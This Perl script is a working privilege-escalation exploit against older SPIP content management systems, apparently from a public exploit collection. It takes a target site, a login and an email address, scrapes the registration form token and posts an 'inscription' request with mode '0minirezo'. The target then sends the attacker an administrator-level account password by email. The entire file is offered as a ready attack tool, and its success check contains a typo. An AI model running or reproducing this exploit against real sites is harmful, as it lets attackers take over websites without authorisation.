#!/usr/bin/perl 
#             ->Author : CrashBandicot

use LWP::UserAgent;
use URI::Escape;
use HTTP::Request;

if($^O =~ /Win/){ system("cls"); }else{ system("clear"); }

banner();

my $usage = "\t        usage: $0 <www.site.com> <login> <mail>\n\n";

die "$usage" unless $ARGV[0] && $ARGV[1] && $ARGV[2];

$site = $ARGV[0];
$login = $ARGV[1];
$mail = $ARGV[2];

$link = "http://$site/spip.php?page=identifiants&mode=0minirezo";

$ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5");
my $req = $ua->get($link)->content;
if($req =~/<input type='hidden' name='formulaire_action_args' value='(.*?)' \/>/ || $req =~ /<input name='formulaire_action_args' type='hidden' value='(.*?)' \/>/) { 

$token = $1;

print "\n\n  [+] First Request Sended ..\n\n";

my $request = $ua->post($link,
{
        var_ajax => 'form',
        page => 'identifiants',
        mode => '0minirezo',
        formulaire_action => 'inscription',
        formulaire_action_args => $token,
        nom_inscription => $login,
        mail_inscription => $mail,
        nobot => '',
})->content;
if($request = ~/Votre nouvel identifiant vient de vous être envoyé par email/) {
print "  [+] Exploit Sended ..\n\n";
print "  [+] Go in your Inbox => $mail see your password ..\n\n";



} else { print "  [-] Exploit Failed ... \n"; exit; }


} else {  print "\n\n  [-] Token Not Found \n"; print "\n  [-] Exploit Failed \n"; exit;}

sub banner { print "\t\n          SPIP < 3.0.9 / 2.1.22 / 2.0.23 Privilege Escalation\n\n"; print "                Author -> CrashBandicot\n\n"; }
